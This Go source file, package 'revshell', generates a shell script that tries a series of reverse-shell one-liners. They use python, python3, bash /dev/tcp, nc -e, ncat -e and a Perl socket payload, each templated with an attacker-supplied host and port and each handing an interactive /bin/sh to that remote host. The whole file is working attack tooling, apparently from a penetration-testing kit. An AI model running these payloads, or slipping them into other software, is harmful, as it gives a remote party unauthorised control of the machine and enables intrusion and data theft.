package revshell

import (
	"text/template"
	"bytes"
)

/* Allow this to support more features in the future. */
type ActionType int
const (
	Cmd ActionType = iota
)
func (d ActionType) String() string {
    return [...]string{"Cmd"}[d]
}

type Action struct {
	Type ActionType
	Command string
}

type CmdInput struct {
	Tool string
	Command string
}

type Conn struct {
	Host string
	Port int
}

func RevShell(host string, port int) string {
	cmds := make(map[string]Action)
	out := new(bytes.Buffer)

	cmds["python"] = Action{Cmd, "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{{.Host}}\",{{.Port}})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'"}
	cmds["python3"] = Action{Cmd, "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{{.Host}}\",{{.Port}})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'"}
	cmds["bash"] = Action{Cmd, "bash -i >& /dev/tcp/{{.Host}}/{{.Port}} 0>&1"}
	cmds["nc"] = Action{Cmd, "nc -e /bin/sh {{.Host}} {{.Port}}"}
	cmds["ncat"] = Action{Cmd, "ncat {{.Host}} {{.Port}} -e /bin/bash"}
	cmds["perl"] = Action{Cmd, "perl -e 'use Socket;$i=\"{{.Host}}\";$p={{.Port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"}
	cmdTmpl, err := template.New("command").Parse(`
if command -v {{.Tool}} > /dev/null 2>&1; then
	{{.Command}}
	exit;
fi;
`)
	if err  != nil {
		panic(err)
	}

	/* Iterate through all the known payloads */
	for key, value := range cmds {
		tmp := new(bytes.Buffer)
		/* Template in our host/port */
		shellTmpl, err := template.New("shell").Parse(value.Command)
		shellTmpl.Execute(tmp, Conn {host, port})
		if err != nil {
			panic(err)
		}
		/* Look at the type to determine what action should be inlcuded. */
		switch value.Type {
			case Cmd:
				err = cmdTmpl.Execute(out, CmdInput {key, tmp.String()})
		}
		if err  != nil {
			panic(err)
		}
	}
	return out.String()

}
